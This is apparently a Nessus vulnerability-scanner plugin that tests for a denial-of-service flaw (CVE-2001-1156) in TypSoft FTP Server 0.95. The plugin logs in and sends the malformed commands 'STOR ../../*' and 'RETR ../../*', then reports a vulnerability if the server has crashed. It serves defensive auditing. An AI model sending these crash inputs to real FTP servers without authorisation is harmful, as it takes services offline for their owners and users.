#
# This script was written by Michel Arboi <arboi@alussinan.org>
#
# GPL
#
# Script audit and contributions from Carmichael Security <http://www.carmichaelsecurity.com>
#      Erik Anderson <eanders@carmichaelsecurity.com>
#      Added BugtraqID and CAN
#
# References:
# Date:  Mon, 08 Oct 2001 14:05:00 +0200
# From: "J. Wagner" <jan.wagner@de.tiscali.com>
# To: bugtraq@securityfocus.com
# CC: "typsoft" <typsoft@altern.org>
# Subject: [ASGUARD-LABS] TYPSoft FTP Server v0.95 STOR/RETR \
#  Denial of Service Vulnerability 
#

if(description)
{
 script_id(11097);
 script_bugtraq_id(3409);
 script_version ("$Revision: 1.11 $");
 script_cve_id("CVE-2001-1156");
 
 name["english"] = "TypSoft FTP STOR/RETR DoS";
 script_name(english:name["english"]);
 
 desc["english"] = "
The remote FTP server crashes when it is sent the command
	RETR ../../*
or
	STOR ../../*

An attacker may use this flaw to make your server crash.

Solution : upgrade your software or use another FTP service.

Risk factor : High";
 
 script_description(english:desc["english"]);
 
 summary["english"] = "Crashes the remote TypSoft FTP server";
 script_summary(english:summary["english"]);
 
 script_category(ACT_DENIAL);
 
 
 script_copyright(english:"This script is Copyright (C) 2002 Michel Arboi");
 family["english"] = "FTP";
 family["francais"] = "FTP";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "ftp_anonymous.nasl");
 script_require_ports("Services/ftp", 21);
 script_exclude_keys("ftp/false_ftp");
 exit(0);
}

#

include("ftp_func.inc");

cmd[0] = "STOR";
cmd[1] = "RETR";

port = get_kb_item("Services/ftp");
if(! port) port = 21;
if(!get_port_state(port)) exit(0);

login = get_kb_item("ftp/login");
pass  = get_kb_item("ftp/password");
if (!login) login = "ftp"; 
if (!pass) pass = "test@nessus.com";

soc = open_sock_tcp(port);
if(! soc) exit(0);

if (!ftp_authenticate(socket:soc, user:login, pass:pass)) exit(0);

#if(!r)exit(0);
for (i=0; i<2;i=i+1)
{
 send(socket:soc, data:string(cmd[i], " ../../*\r\n"));
 r = recv_line(socket:soc, length:20000);
 }
ftp_close(socket: soc);

soc = open_sock_tcp(port);
if (!soc) security_hole(port);
if (soc) ftp_close(socket: soc);
